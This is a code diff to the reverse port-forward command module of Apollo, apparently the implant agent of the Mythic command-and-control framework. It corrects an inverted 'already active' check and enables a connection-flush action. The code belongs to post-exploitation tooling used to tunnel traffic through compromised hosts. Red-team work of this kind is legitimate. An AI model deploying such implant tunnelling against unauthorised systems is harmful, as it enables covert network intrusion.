@@ -7,6 +7,7 @@ using Apollo.RPortFwdProxy;
 using Apollo.Tasks;
 using Mythic.Structs;
 using System;
+using System.IO;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -27,10 +28,8 @@ namespace Apollo.CommandModules
         public static void Execute(Job job, Agent agent)
         {
             Task task = job.Task;
-
             JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
             string action = json.Value<string>("action");
-            //SocksParams socksParams = Newtonsoft.Json.JsonConvert.DeserializeObject<SocksParams>(job.Task.parameters);
             string port = "0";
             string rport = "0";
             string rip = "";
@@ -49,14 +48,13 @@ namespace Apollo.CommandModules
                         job.SetError("Parameters to start Port Forward not found");
                         return;
                     }
-                    if (!RPortFwdController.IsActive(port))
+                    if (RPortFwdController.IsActive(port))
                     {
                         job.SetError("Port Forward is already active in that port.");
                         return;
                     }
-
+                    
                     RPortFwdController.StartClientPort(port, rport, rip);
-
                     job.SetComplete($"Port Forward connection started.");
 
                     break;
@@ -80,8 +78,8 @@ namespace Apollo.CommandModules
                     }
                     break;
                 case "flush":
-                    //RPortFwdController.FlushClient();
-                    job.SetComplete("Port Forward flush not implemented yet.");
+                    RPortFwdController.FlushClient();
+                    job.SetComplete("Flushed All Conections.");
                     break;
                 case "list":
                     string list = RPortFwdController.ListPortForward();
